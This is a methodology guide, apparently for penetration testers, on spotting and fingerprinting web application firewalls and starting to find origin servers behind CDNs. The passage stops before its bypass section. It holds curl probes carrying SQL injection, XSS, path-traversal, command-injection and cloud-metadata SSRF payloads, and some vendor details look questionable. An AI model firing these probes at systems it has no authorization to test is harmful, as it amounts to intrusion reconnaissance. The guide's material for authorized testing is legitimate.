# WAF Identification & Bypass

A comprehensive methodology for identifying Web Application Firewalls, fingerprinting specific WAF vendors, discovering origin servers, and systematically bypassing WAF protections. This is an essential skill for bug bounty hunters and penetration testers — every mature target runs behind at least one WAF or CDN.

## Table of Contents

1. [WAF Identification](#waf-identification)
2. [WAF Fingerprinting](#waf-fingerprinting)
3. [Origin Discovery](#origin-discovery)
4. [Bypass Technique Catalog](#bypass-technique-catalog)
5. [Cloudflare-Specific Bypasses](#cloudflare-specific-bypasses)
6. [Bypass Validation](#bypass-validation)
7. [Tooling](#tooling)
8. [Rate Limiting & IP Rotation](#rate-limiting--ip-rotation)
9. [Crawler/Directory Scanner Bypass](#crawlerdirectory-scanner-bypass)
10. [Checklist](#checklist)

---

## WAF Identification

### Response Header Analysis

WAFs and CDNs leave distinctive fingerprints in HTTP response headers. The presence of certain headers is often the first clue that a WAF is in play.

#### CDN/WAF Header Signatures

| Header | Typical Value | Likely WAF/CDN |
|--------|---------------|----------------|
| `CF-Ray` | `cf-ray: 4a3b2c1d0e5f6a7b-YYZ` | Cloudflare |
| `Server` | `cloudflare` | Cloudflare |
| `X-Served-By` | `cache-abc123` | Fastly |
| `X-Cache` | `Hit from cloudfront` | AWS CloudFront |
| `X-Amz-Cf-*` | Various | AWS CloudFront |
| `X-Akamai-Transformed` | `9` or similar | Akamai |
| `X-Akamai-Request-ID` | UUID string | Akamai |
| `Akamai-Grn` | String | Akamai |
| `X-CDN` | `Incapsula` | Imperva/Incapsula |
| `X-Iinfo` | String | Imperva/Incapsula |
| `X-ASM-*` | Various | F5 BigIP ASM |
| `X-ASM-Policy` | Policy name | F5 BigIP ASM |
| `X-Mod-Security` | Various | ModSecurity |
| `X-Sucuri-ID` | String | Sucuri |
| `X-Sucuri-Cache` | `HIT`/`MISS` | Sucuri |
| `X-Proxy` | `stackpath` / `StackPath` | StackPath |
| `X-Cache'` | `HIT`, `MISS` | Generic CDN |

#### Server Header Overrides

Some WAFs replace the origin's `Server` header:

```http
# Origin server header (without WAF):
Server: nginx/1.24.0
Server: Apache/2.4.57 (Ubuntu)

# With WAF fronting:
Server: cloudflare
Server: AkamaiGHost
Server: Microsoft-IIS/10.0  (overridden by WAF)
```

**Note:** The absence of CDN/WAF headers does not mean no WAF is present. Some WAFs operate in transparent bridge mode and do not modify headers.

### Response Code Patterns

Different WAFs use different HTTP status codes when blocking requests:

| WAF | Typical Block Code | Common Block Body |
|-----|-------------------|-------------------|
| Cloudflare | `403`, `503`, `1020` | "Attention Required! | Cloudflare" |
| AWS WAF | `403` | `RequestBlocked` or `{"message":"Request blocked"}` |
| Akamai | `403`, `406` | "Access Denied" + reference ID |
| F5 ASM | `403`, `400` | "The requested URL was rejected" + support ID |
| Imperva | `403`, `406` | "Incapsula: Request blocked" |
| ModSecurity | `406` (default), `403`, `500` | Various |
| Sucuri | `403`, `400` | "Blocked by Sucuri" |
| Wordfence | `403`, `503` | "Blocked by Wordfence" |
| StackPath | `403` | "Access Denied" |
| Radware | `403` | "Bad Request" |
| Barracuda | `403` | "Request blocked by Barracuda" |

#### Cloudflare-Specific Error Codes

```
520  → Origin returned unknown error
521  → Origin refused connection
522  → Origin connection timed out
523  → Origin unreachable
524  → Origin connection timed out during request
525  → SSL handshake failed
526  → Invalid SSL certificate
527  → Railgun error
530  → Site frozen
1000 → DNS points to prohibited IP
1001 → DNS resolution error
1002 → DNS points to local or disallowed IP
1003 → Direct IP access not allowed
1004 → Host not configured to serve the web traffic
1010 → The owner of this website does not allow hotlinking
1011 → Access denied (IP block)
1014 → CNAME Cross-User Banned
1015 → Rate limit exceeded
1016 → Origin DNS error
1020 → Access denied (WAF rule triggered)
1025 → Connection timed out (origin)
1033 → Argo Tunnel error
```

### Challenge Pages

WAFs that present interactive challenges are easy to identify:

#### Cloudflare JS Challenge (IUAM — I'm Under Attack Mode)

```html
<!DOCTYPE html>
<html lang="en-US">
<head>
  <title>Just a moment...</title>
  <style>
    body { font-family: sans-serif; }
    #cf-content { display: none; }
  </style>
</head>
<body>
  <div id="cf-content">
    <h1>Checking your browser before accessing the website.</h1>
    <p>This process is automatic. Your browser will redirect shortly.</p>
  </div>
  <script>
    // Cloudflare challenge JavaScript
    // a, c, e, d, f, etc. — obfuscated JS challenge
  </script>
  <noscript>
    <h1>JavaScript Required</h1>
    <p>Please enable JavaScript to continue.</p>
  </noscript>
</body>
</html>
```

#### Cloudflare CAPTCHA Page

```html
<!DOCTYPE html>
<html lang="en-US">
<head>
  <title>Attention Required! | Cloudflare</title>
  <meta id="cf-captcha-container" content="...">
</head>
<body>
  <div class="cf-browser-verification">
    <h1>Please complete the security check to access the website.</h1>
    <div id="captcha-box">...</div>
  </div>
</body>
</html>
```

#### Akamai Challenge Page

```html
<!DOCTYPE html>
<html>
<head>
  <title>Verify your identity</title>
  <script type="text/javascript" src="https://www.akamai.com/sensor.js"></script>
</head>
<body>
  <h1>Checking your browser</h1>
  <p>This process is automatic.</p>
</body>
</html>
```

#### Imperva/Incapsula Challenge

```html
<!DOCTYPE html>
<html>
<head>
  <title>Bot Verification</title>
</head>
<body>
  <div id="__incapsula_verify">
    <h1>Checking your browser</h1>
  </div>
  <script>// Incapsula challenge script</script>
</body>
</html>
```

### Delay Patterns

WAFs often introduce deliberate delays when challenging or blocking requests. These timing signatures can reveal WAF presence:

| WAF | Typical Delay | Mechanism |
|-----|---------------|-----------|
| Cloudflare JS challenge | 3-6 seconds | JS computation before redirect |
| Akamai | 1-3 seconds | Sensor validation delay |
| Imperva | 2-5 seconds | Challenge page load time |
| F5 ASM | 50-200ms | Learning mode delay |
| ModSecurity | 10-100ms | Rule processing overhead |

**Measuring delay:**

```shell
# Time a normal request
curl -o /dev/null -s -w "Time: %{time_total}s\n" https://target.com/

# Time a request with SQLi payload
curl -o /dev/null -s -w "Time: %{time_total}s\n" "https://target.com/?id=1' OR '1'='1"

# If the second request takes notably longer (even returning 403),
# the WAF is likely processing the payload against its rule set.
```

### Cookie Analysis

WAFs drop specific cookies for tracking, challenge completion, and session management:

| Cookie | WAF | Purpose |
|--------|-----|---------|
| `cf_clearance` | Cloudflare | JS/CAPTCHA challenge passed |
| `__cf_bm` | Cloudflare | Bot management |
| `__cfduid` | Cloudflare | Client identification (legacy) |
| `ak_bmsc` | Akamai | Bot manager session cookie |
| `bm_sz` | Akamai | Bot manager fingerprint |
| `_abck` | Akamai | Browser fingerprinting |
| `bm_mi` | Akamai | Bot manager mobile |
| `incap_ses_*` | Imperva | Session cookie |
| `visid_incap_*` | Imperva | Visitor ID (persistent) |
| `nlbi_*` | Imperva | Load balancer cookie |
| `ASPSESSIONID*` | F5 ASM (IIS) | Session tracking |
| `TS01*` | F5 (Traffix) | Session cookie |
| `sucuri_cloudproxy_*` | Sucuri | Session tracking |
| `wfwaf-authcookie*` | Wordfence | WAF auth cookie |

**Example cookie collection from headers:**

```shell
# Check for Akamai cookies
curl -v https://target.com/ 2>&1 | grep -i 'set-cookie' | grep -iE 'ak_bmsc|_abck|bm_sz'

# Check for Cloudflare cookies
curl -v https://target.com/ 2>&1 | grep -i 'set-cookie' | grep -iE 'cf_clearance|__cf_bm'

# Check for Imperva cookies
curl -v https://target.com/ 2>&1 | grep -i 'set-cookie' | grep -iE 'incap_ses|visid_incap|nlbi'
```

### WAF Block Page HTML Fingerprints

| WAF | Distinctive HTML Fragment |
|-----|--------------------------|
| Cloudflare | `class="cf-browser-verification"` |
| Cloudflare | `id="cf-content"` |
| Cloudflare 1020 | `id="cf-error-details"` |
| Akamai | `id="akamai-challenge"` |
| Akamai | `src="/akamai/challenge.js"` |
| Imperva | `id="__incapsula_verify"` |
| F5 ASM | `<title>The requested URL was rejected</title>` |
| ModSecurity | `id="mod_security_error"` |
| Sucuri | `class="sucuri-block"` |

---

## WAF Fingerprinting

### Cloudflare

Cloudflare is the most commonly encountered WAF. Multiple indicators confirm its presence:

**Headers:**
```http
CF-Ray: 4a3b2c1d0e5f6a7b-YYZ
Server: cloudflare
CF-Cache-Status: HIT/MISS/DYNAMIC/EXPIRED
CF-Connecting-IP: <visitor IP>
CF-Worker: <worker-name> (if Cloudflare Workers are used)
```

**Ray ID decoding:**
```
CF-Ray: 4a3b2c1d0e5f6a7b-YYZ
        ^^^^^^^^^^^^^^^^ ^^^
        Request ID       Datacenter code (YYZ = Toronto)
```

**Common Cloudflare datacenter codes:**
```
YYZ → Toronto, Canada
LHR → London, UK
CDG → Paris, France
FRA → Frankfurt, Germany
SFO → San Francisco, USA
IAD → Washington DC, USA
HKG → Hong Kong
NRT → Tokyo, Japan
SIN → Singapore
SYD → Sydney, Australia
```

**Error page identification (HTTP 1020):**

```html
<div id="cf-error-details">
  <div class="cf-error-overview">
    <h1>Access denied</h1>
    <span>What happened?</span>
    <p>This website is using a security service to protect itself from online attacks.</p>
  </div>
  <div class="cf-highlight">
    <span>Ray ID:</span> <code>4a3b2c1d0e5f6a7b</code>
  </div>
</div>
```

**Testing for Cloudflare:**

```shell
# Check headers
curl -sI https://target.com/ | findstr "CF-Ray Server: cloudflare"

# Trigger a WAF block
curl -s "https://target.com/?q=<script>alert(1)</script>" | findstr "cf-error-details"

# Check for challenge page
curl -s https://target.com/ | findstr "cf-browser-verification"

# Identify datacenter via ray ID
curl -sI https://target.com/ | findstr "CF-Ray"
```

**Cloudflare plan identification:**

```shell
# Check if it's an Enterprise plan (no CF-Ray in some cases on Enterprise)
# Enterprise plans can have:
curl -sI https://target.com/ | findstr "Expect-CT"

# Free/Pro/Business typically include CF-Ray and Server: cloudflare
# Enterprise may hide these headers
```

### AWS CloudFront / AWS WAF

**Headers:**
```http
X-Cache: Hit from cloudfront
X-Cache: Miss from cloudfront
X-Amz-Cf-Id: <hash>
X-Amz-Cf-Pop: <edge-location-code>
Via: 1.1 <hash>.cloudfront.net (CloudFront)
Age: <seconds>
```

**CloudFront edge location codes:**
```
IAD50-C1 → Washington DC
EWR50-C1 → Newark, NJ
LAX50-C1 → Los Angeles, CA
FRA60-C1 → Frankfurt, Germany
LHR61-C1 → London, UK
NRT20-C1 → Tokyo, Japan
SIN5-C1  → Singapore
SYD62-C1 → Sydney, Australia
```

**AWS WAF block response:**
```json
HTTP/1.1 403 Forbidden
Content-Type: application/json

{
  "message": "Request blocked",
  "code": "AccessDenied",
  "requestId": "abc-123-def-456"
}
```

Or HTML:
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head><title>403 Forbidden</title></head>
<body>
  <h1>403 Forbidden</h1>
  Request blocked by AWS WAF
</body>
</html>
```

**Testing for AWS WAF:**

```shell
# Check CloudFront headers
curl -sI https://target.com/ | findstr "X-Cache X-Amz-Cf-Id Via"

# Check for WAF block on SQLi
curl -s -w "\n%{http_code}" "https://target.com/?id=1 UNION SELECT 1,2,3--"

# Check for Rate-Based rule (RequestLimitExceeded)
curl -s -w "\n%{http_code}" "https://target.com/" -H "User-Agent: bad-bot"
```

**AWS WAF managed rule groups that may be active:**
```
AWSManagedRulesCommonRuleSet        → SQLi, XSS, LFI, RFI, PHP/WordPress specific
AWSManagedRulesAdminProtectionRuleSet  → admin page access
AWSManagedRulesKnownBadInputsRuleSet   → known bad patterns and probes
AWSManagedRulesSQLiRuleSet         → SQL injection
AWSManagedRulesLinuxRuleSet        → Linux-specific attacks (LFI, RCE)
AWSManagedRulesUnixRuleSet         → Unix commands in input
AWSManagedRulesWindowsRuleSet      → Windows commands in input
AWSManagedRulesPHPRuleSet          → PHP attacks (webshell, RFI)
AWSManagedRulesWordPressRuleSet    → WordPress-specific attacks
AWSManagedRulesAmazonIpReputationList → IP reputation
AWSManagedRulesAnonymousIpList     → VPN, proxy, Tor
AWSManagedRulesBotControlRuleSet   → Bot management
```

### Akamai

**Headers:**
```http
X-Akamai-Transformed: 9
X-Akamai-Request-ID: <uuid>
X-Akamai-Transformed: 9 0 2 0 v:none
Akamai-Grn: <hash>
Server: AkamaiGHost
```

**Akamai challenge behavior:**

Akamai uses multiple challenge mechanisms:

1. **Cookie challenge** — Drops `ak_bmsc` and `_abck` cookies
2. **JavaScript challenge** — Sensor validation via `sensor.js`
3. **CAPTCHA challenge** — For high-risk requests

**Testing for Akamai:**

```shell
# Check Akamai headers
curl -sI https://target.com/ | findstr "X-Akamai"

# Check Akamai cookies
curl -v https://target.com/ 2>&1 | findstr "ak_bmsc _abck bm_sz"

# Trigger Akamai block
curl -s -w "\n%{http_code}" "https://target.com/?q=../../etc/passwd"

# Check for Akamai sensor
curl -s https://target.com/ | findstr "akamai.com/sensor"
```

**Akamai `_abck` cookie structure:**

```
_abck: C5B6D9E8F7A4B3C2~0~YAAQ6NjRfghijklmnoPqrStUvWxYzAAAAAgA...
```
- First segment: Browser fingerprint hash
- Second segment (after `~`): Challenge state (0 = success, 1 = challenge, 2 = denied)
- Used by Akamai Bot Manager (not all Akamai customers have Bot Manager enabled)

### F5 BigIP ASM

**Headers:**
```http
X-ASM-Policy: <policy-name>
X-ASM-Request-ID: <id>
X-ASM-Version: <version>
X-Content-Type-Options: nosniff
X-F5-Auth: <hash>
```

**Block response:**
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <title>The requested URL was rejected</title>
</head>
<body>
  <h1>The requested URL was rejected</h1>
  <p>Please consult with your administrator.</p>
  <p>Your support ID is: 1234567890123456789</p>
  <p><a href="https://target.com/blocked?support=1234567890123456789">Click here</a></p>
</body>
</html>
```

**Support ID decoding:**

The F5 ASM support ID (attack ID) encodes the violation type:

```
Support ID: 1234567890123456789
```

The last digits often indicate the specific violation. Common violation types:
- `200000001` → Illegal Content-Type
- `200000002` → Illegal method
- `200000003` → SQL injection
- `200000004` → XSS
- `200000005` → Command injection
- `200000006` → Path traversal
- `200000007` → LDAP injection
- `200000008` → SSRF
- `200000009` → HTTP protocol violation
- `200000010` → Cookie manipulation

**Testing for F5 ASM:**

```shell
# Check for F5 ASM headers
curl -sI https://target.com/ | findstr "X-ASM X-F5"

# Trigger ASM block
curl -s "https://target.com/?q=' OR 1=1--" | findstr "The requested URL was rejected"

# Check for BIG-IP cookie
curl -v https://target.com/ 2>&1 | findstr "BIGipServer"
```

### Imperva / Incapsula

**Headers:**
```http
X-CDN: Incapsula
X-Iinfo: <encoded-string>
X-CDN-Forwarded-For: <client-IP>
```

**Cookies:**
```
incap_ses_<id>_<site-id> → Session cookie
visid_incap_<site-id>    → Persistent visitor ID (2 year expiry)
nlbi_<id>                → Load balancer persistence cookie
```

**Block page (403):**
```html
<!DOCTYPE html>
<html>
<head>
  <title>Bot Verification</title>
</head>
<body>
  <div id="__incapsula_verify">
    <h1>Checking your browser</h1>
    <p>This process is automatic.</p>
  </div>
  <script type="text/javascript">
    // Incapsula challenge script
    // Looks for specific browser properties
  </script>
</body>
</html>
```

**Testing for Imperva:**

```shell
# Check Imperva headers
curl -sI https://target.com/ | findstr "X-CDN X-Iinfo"

# Check Incapsula cookies
curl -v https://target.com/ 2>&1 | findstr "incap_ses visid_incap nlbi"

# Trigger Imperva block
curl -s "https://target.com/?q=1' OR '1'='1" | findstr "incapsula"

# X-Iinfo decoding (base64 encoded internal data)
curl -sI https://target.com/ | findstr "X-Iinfo"
```

### ModSecurity

**Headers:**
```http
X-Mod-Security: <id>
X-Content-Type-Options: nosniff (added by ModSecurity)
```

**Block response (default 406 Not Acceptable):**
```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<html>
<head>
  <title>406 Not Acceptable</title>
</head>
<body>
  <h1>Not Acceptable</h1>
  <p>An appropriate representation of the requested resource could not be found on this server.</p>
  <p><b>Error ID:</b> 1234567890</p>
</body>
</html>
```

**Common ModSecurity rule IDs:**
```
950001 → SQL Injection
950007 → SQL Injection
950008 → SQL Injection
951111 → SQL Injection
952001 → SQL Injection (blind)
953001 → XSS
954001 → Cross-site Scripting
958001 → Cross-site Scripting
958009 → Cross-site Scripting
959001 → Cross-site Scripting
960000 → HTTP Protocol Violation
960001 → Request Missing Required Header
960002 → Request Missing Required Host Header
960008 → Request Contains Unescaped Spaces
960011 → Non-ASCII Characters
960012 → Request Body Size Limit
960013 → Request Content Type Missing
960015 → Request URL Encoding
960024 → Request Content Type Not Allowed
960034 → Multipart/Form-Data Boundary
960901 → Slowloris Attack
960902 → Slowloris Attack
970001 → SQL Injection
970002 → SQL Injection
970003 → SQL Injection
970004 → SQL Injection
970005 → SQL Injection
970006 → SQL Injection
970007 → SQL Injection
970008 → SQL Injection
970009 → SQL Injection
970010 → SQL Injection
970011 → SQL Injection
970012 → SQL Injection
970013 → SQL Injection
970014 → SQL Injection
973300 → XSS
973301 → XSS
973302 → XSS
973303 → XSS
973304 → XSS
973305 → XSS
973306 → XSS
981000 → SQL Injection
981001 → SQL Injection
981002 → SQL Injection
981003 → SQL Injection
981004 → SQL Injection
981005 → SQL Injection
981006 → SQL Injection
981007 → SQL Injection
981008 → SQL Injection
981009 → SQL Injection
981010 → SQL Injection
981011 → SQL Injection
981012 → SQL Injection
981013 → SQL Injection
981014 → SQL Injection
981242 → SQL Injection Blind
981243 → SQL Injection Blind
981244 → SQL Injection Blind
981245 → SQL Injection Blind
981246 → SQL Injection Blind
981247 → SQL Injection Blind
981248 → SQL Injection Blind
981249 → SQL Injection Blind
981250 → SQL Injection Blind
981251 → SQL Injection Blind
981252 → SQL Injection Blind
981253 → SQL Injection Blind
981254 → SQL Injection Blind
981255 → SQL Injection Blind
981256 → SQL Injection Blind
981257 → SQL Injection Blind
981258 → SQL Injection Blind
981259 → SQL Injection Blind
981260 → SQL Injection Blind
981261 → SQL Injection Blind
981262 → SQL Injection Blind
981263 → SQL Injection Blind
981264 → SQL Injection Blind
981265 → SQL Injection Blind
981266 → SQL Injection Blind
981267 → SQL Injection Blind
981268 → SQL Injection Blind
981269 → SQL Injection Blind
981270 → SQL Injection Blind
981271 → SQL Injection Blind
981272 → SQL Injection Blind
981273 → SQL Injection Blind
981274 → SQL Injection Blind
981275 → SQL Injection Blind
981276 → SQL Injection Blind
981277 → SQL Injection Blind
981278 → SQL Injection Blind
981279 → SQL Injection Blind
981280 → SQL Injection Blind
981281 → SQL Injection Blind
981282 → SQL Injection Blind
981283 → SQL Injection Blind
981284 → SQL Injection Blind
981285 → SQL Injection Blind
981286 → SQL Injection Blind
981287 → SQL Injection Blind
981288 → SQL Injection Blind
981289 → SQL Injection Blind
981290 → SQL Injection Blind
981291 → SQL Injection Blind
981292 → SQL Injection Blind
981293 → SQL Injection Blind
981294 → SQL Injection Blind
981295 → SQL Injection Blind
981296 → SQL Injection Blind
981297 → SQL Injection Blind
981298 → SQL Injection Blind
981299 → SQL Injection Blind
981300 → SQL Injection Blind
981301 → SQL Injection Blind
```

**Testing for ModSecurity:**

```shell
# Check for ModSecurity header
curl -sI https://target.com/ | findstr "X-Mod-Security"

# Trigger ModSecurity block (default 406)
curl -s -w "\n%{http_code}" "https://target.com/?q=1' OR '1'='1"

# Send a request with known attack signature
curl -s "https://target.com/?q=<script>alert(1)</script>" | findstr "406 Not Acceptable"
```

### Sucuri

**Headers:**
```http
X-Sucuri-ID: <id>
X-Sucuri-Cache: HIT/MISS
X-Content-Security-Policy: <policy>
```

**Block response:**
```html
<!DOCTYPE html>
<html>
<head>
  <title>Access Denied</title>
</head>
<body>
  <p>
    Access to this website has been blocked by Sucuri.
    If you believe this is an error, please contact the site owner.
  </p>
  <p>
    Your IP: <span class="sucuri-ip">1.2.3.4</span>
    <br>
    Reason: Malicious traffic detected
    <br>
    URL: /?q=malicious-payload
  </p>
</body>
</html>
```

**Testing for Sucuri:**

```shell
# Check Sucuri headers
curl -sI https://target.com/ | findstr "X-Sucuri"

# Trigger Sucuri block
curl -s "https://target.com/?q=../../etc/passwd" | findstr "blocked by Sucuri"

# Check Sucuri cookie
curl -v https://target.com/ 2>&1 | findstr "sucuri_cloudproxy"
```

### Wordfence (WordPress)

**Block response (WAF mode — not firewall plugin):**

```html
<!DOCTYPE html>
<html>
<head>
  <title>403 Forbidden</title>
</head>
<body>
  <h1>403 Forbidden</h1>
  <p>A potentially unsafe operation has been detected.
  Please try again or contact support.</p>
</body>
</html>
```

**Wordfence-specific patterns:**

```
/?p=1337&wfwaf-authcookie= (authenticated WAF bypass)

/wp-admin/admin-ajax.php?action=wordfence_ls_authenticate&secret=<key>
```

**Testing for Wordfence:**

```shell
# Check for Wordfence by accessing common WordPress paths
curl -s -I "https://target.com/wp-content/plugins/wordfence/"
curl -s "https://target.com/?d=1' OR '1'='1" | findstr "Wordfence"

# Check Wordfence cookie
curl -v "https://target.com/" 2>&1 | findstr "wfwaf-authcookie"

# Check Wordfence block page
curl -s "https://target.com/?q=<script>alert(1)</script>" | findstr "potentially unsafe"
```

### Fastly

**Headers:**
```http
X-Served-By: cache-abc123
X-Cache: HIT, HIT
X-Cache-Hits: 1
X-Timer: S1234567890.123456,VS0,VE0
Fastly-Debug-Digest: <digest>
Via: 1.1 varnish, 1.1 varnish
Age: 12345
```

**Testing for Fastly:**

```shell
# Check Fastly headers
curl -sI https://target.com/ | findstr "X-Served-By X-Cache Fastly"

# Fastly-specific debug endpoint
curl -sI "https://target.com/?__fastly_debug=1"

# Fastly purge detection
curl -sI https://target.com/ | findstr "X-Purge-URL"
```

### StackPath

**Headers:**
```http
X-Proxy: stackpath
X-Proxy-Cache: HIT/MISS
Server: stackpath
```

**Testing for StackPath:**

```shell
# Check StackPath headers
curl -sI https://target.com/ | findstr "X-Proxy Server: stackpath"

# Trigger StackPath block
curl -s "https://target.com/?q=1' OR 1=1--"
```

### Blocking Detection Methodology

**Systematic approach to confirm WAF presence:**

```shell
# Step 1: Baseline request — get clean response
curl -s -o /dev/null -w "Status: %{http_code}\nSize: %{size_download}\nTime: %{time_total}s\n" \
  https://target.com/

# Step 2: Payload request — trigger WAF
curl -s -o /tmp/blocked_response.txt -w "Status: %{http_code}\n" \
  "https://target.com/?q=<script>alert(1)</script>"

# Step 3: Compare responses
diff <(curl -s https://target.com/) <(curl -s "https://target.com/?q=<script>alert(1)</script>")

# Step 4: Check for WAF headers in both responses
curl -sI https://target.com/ > /tmp/clean_headers.txt
curl -sI "https://target.com/?q=<script>alert(1)</script>" > /tmp/blocked_headers.txt
```

**Response comparison automation:**

```python
import requests

def detect_waf(url, payloads):
    """Test multiple payloads and detect WAF characteristics."""
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 ..."})
    
    # Baseline
    baseline = session.get(url)
    
    for name, payload in payloads.items():
        test_url = url + "?q=" + payload
        resp = session.get(test_url)
        
        diff_size = len(resp.text) - len(baseline.text)
        diff_headers = set(resp.headers.keys()) - set(baseline.headers.keys())
        diff_code = resp.status_code != baseline.status_code
        
        if diff_code or diff_size > 100 or diff_headers:
            print(f"[WAF DETECTED] Payload: {name}")
            print(f"  Status: {baseline.status_code} → {resp.status_code}")
            print(f"  Size delta: {diff_size}")
            print(f"  New headers: {diff_headers}")
            
            # Check for common WAF fingerprints
            for waf, signatures in WAF_SIGNATURES.items():
                if any(sig in resp.text.lower() for sig in signatures):
                    print(f"  WAF: {waf}")
        else:
            print(f"[ALLOWED] Payload: {name}")

payloads = {
    "xss_basic": "<script>alert(1)</script>",
    "sqli_basic": "1' OR '1'='1",
    "lfi_basic": "../../etc/passwd",
    "cmd_inject": ";id",
    "xss_img": "<img/src=x onerror=alert(1)>",
    "sqli_union": "1 UNION SELECT 1,2,3--",
    "ssti_jinja": "{{7*7}}",
    "ssrf_basic": "http://169.254.169.254/",
}

WAF_SIGNATURES = {
    "Cloudflare": ["cloudflare", "cf-error-details", "cf-browser-verification"],
    "Akamai": ["akamai", "reference number", "x-akamai"],
    "Imperva": ["incapsula", "_incapsula_verify", "x-cdn: incapsula"],
    "F5_ASM": ["the requested url was rejected", "support id", "x-asm"],
    "ModSecurity": ["406 not acceptable", "mod_security", "x-mod-security"],
    "Sucuri": ["sucuri", "blocked by sucuri", "x-sucuri"],
    "Wordfence": ["wordfence", "potentially unsafe operation"],
    "AWS_WAF": ["request blocked", "awswaf", "x-amz-cf"],
}
```

---

## Origin Discovery

Once a WAF is identified, the next step is finding the origin server IP. A WAF is only useful if traffic goes through it — requests sent directly to the origin bypass all WAF rules.

### CNAME Resolution

The most straightforward approach. The domain's CNAME often reveals the CDN:

```shell
# Check CNAME record
nslookup -type=cname target.com

# On Windows:
nslookup target.com | findstr "canonical name"
resolv -type cname target.com   # if available

# Example output:
# target.com canonical name = target.com.cdn.cloudflare.net.
# target.com canonical name = d1234abcd.cloudfront.net.
# target.com canonical name = target.com.akamaiedge.net.
# target.com canonical name = d1234.fastly.net.
```

**CDN CNAME patterns:**

| CDN | CNAME Pattern |
|-----|---------------|
| Cloudflare | `*.cdn.cloudflare.net` |
| AWS CloudFront | `*.cloudfront.net` |
| Akamai | `*.akamaiedge.net`, `*.edgesuite.net` |
| Fastly | `*.fastly.net` |
| StackPath | `*.stackpathcdn.com` |
| KeyCDN | `*.kxcdn.com` |
| BunnyCDN | `*.bunnycdn.com`, `*.b-cdn.net` |
| Azure CDN | `*.azureedge.net`, `*.azurefd.net` |
| GCP (Cloud CDN) | `*.cdn.example.com` (custom) |
| Imperva | `*.incapsula.com` (origin hidden by default) |

### Certificate Transparency Logs

Certificate Transparency (CT) logs can reveal origin IPs by showing all certificates ever issued for a domain, including those before the WAF was deployed.

```shell
# Using crt.sh
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  python3 -c "import sys,json; data=json.load(sys.stdin); \
  [print(f'{d[\"name_value\"]} | {d[\"not_before\"]}') for d in data]" | \
  sort -u

# Using certspotter
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | \
  python3 -m json.tool
```

**Historical certificate IP extraction:**

```python
import requests
import json

def find_historical_ips(domain):
    """Extract historical IPs from certificate transparency logs."""
    # crt.sh query
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    resp = requests.get(url)
    certs = resp.json()
    
    # Group by SAN (Subject Alternative Name)
    ips_found = []
    for cert in certs:
        name = cert.get('name_value', '')
        if '\n' in name:
            names = name.split('\n')
        else:
            names = [name]
        ips_found.extend(n for n in names if n.count('.') == 3 and n.replace('.', '').isdigit())
    
    # Also check for subdomains that might resolve directly
    subdomains = set()
    for cert in certs:
        name = cert.get('name_value', '')
        if '\n' in name:
            for n in name.split('\n'):
                if domain in n:
                    subdomains.add(n.strip())
        elif domain in name:
            subdomains.add(name.strip())
    
    return list(set(ips_found)), subdomains
```

**crt.sh advanced query operators:**

```shell
# Exact match (no wildcard)
curl -s "https://crt.sh/?q=target.com&exclude=wildcard&output=json"

# By hash
curl -s "https://crt.sh/?sha256=abcd1234..."

# Identity match (includes parent + child)
curl -s "https://crt.sh/?identity=target.com&output=json"
```

### DNS History

Historical DNS records often contain origin IPs from before the WAF was deployed:

```shell
# SecurityTrails API (free tier limited)
curl -s "https://api.securitytrails.com/v1/domain/target.com/history/dns/a" \
  -H "APIKEY: <key>" | python3 -m json.tool

# PassiveTotal (RiskIQ)
curl -s "https://api.passivetotal.org/v2/dns/passive/unique" \
  --data '{"query":"target.com"}' -u "<email>:<key>"

# DNSDumpster
curl -s "https://dnsdumpster.com/" -c /tmp/cookies.txt > /dev/null
# ... then POST with csrf token (requires scraping)

# VirusTotal passive DNS
curl -s "https://www.virustotal.com/api/v3/domains/target.com/resolutions" \
  -H "x-apikey: <key>"
```

**Common sources for historical DNS:**
- SecurityTrails (securitytrails.com)
- PassiveTotal (community.riskiq.com)
- VirusTotal (virustotal.com)
- DNSDumpster (dnsdumpster.com)
- ViewDNS (viewdns.info)
- whoisxmlapi.com
- AlienVault OTX (otx.alienvault.com)
- Censys (censys.io)
- Shodan (shodan.io)

### Favicon Hash (Shodan/Censys)

Many origin servers serve the same favicon as the WAF-protected site. Hash the favicon and search on Shodan:

```shell
# Download the favicon
curl -s -o /tmp/favicon.ico https://target.com/favicon.ico

# Calculate the MMH3 hash (what Shodan uses)
python3 -c "
import mmh3
import requests
import codecs

url = 'https://target.com/favicon.ico'
response = requests.get(url)
favicon = codecs.encode(response.content, 'base64')
hash = mmh3.hash(favicon)
print(f'Favicon hash: {hash}')
# Search on Shodan: http.favicon.hash:{hash}
"
```

**Search on Shodan:**
```
http.favicon.hash:-1234567890
```

**Search on Censys:**
```shell
# Censys search for favicon hash
curl -s "https://search.censys.io/api/v2/hosts/search?q=services.http.response.favicons.md5_hash:<hash>&per_page=100" \
  -H "Accept: application/json"
```

**Alternative: Compute SHA256 of favicon for Censys:**
```shell
python3 -c "
import hashlib
favicon = open('/tmp/favicon.ico', 'rb').read()
print(hashlib.sha256(favicon).hexdigest())
"
```

### HTTP Header Leaks

Certain HTTP headers can leak origin server information:

```shell
# Check for X-Forwarded-Host reflection
curl -sI "https://target.com/" -H "X-Forwarded-Host: origin.target.com"

# Check for Origin header reflection
curl -sI "https://target.com/" -H "Origin: https://evil.com" -H "Host: target.com"

# Check if the origin header is reflected in response headers
curl -v "https://target.com/" -H "X-Forwarded-For: 127.0.0.1" 2>&1 | findstr "Origin"
curl -v "https://target.com/" -H "X-Real-IP: 127.0.0.1" 2>&1 | findstr "Real-IP"
```

**Leaky header patterns:**

```shell
# Method override sometimes bypasses WAF and leaks origin info
curl -v "https://target.com/" -H "X-HTTP-Method-Override: GET"

# TRACE method may echo back headers including internal IPs
curl -X TRACE -v "https://target.com/"

# OPTIONS may reveal more server info
curl -X OPTIONS -v "https://target.com/"

# Check if the server responds differently to direct IP access
curl -v "https://1.2.3.4/" -H "Host: target.com"
```

### RSS Feed URLs

RSS/Atom feeds often contain full URLs with the original domain and may bypass WAF:

```shell
# Look for RSS links in page source
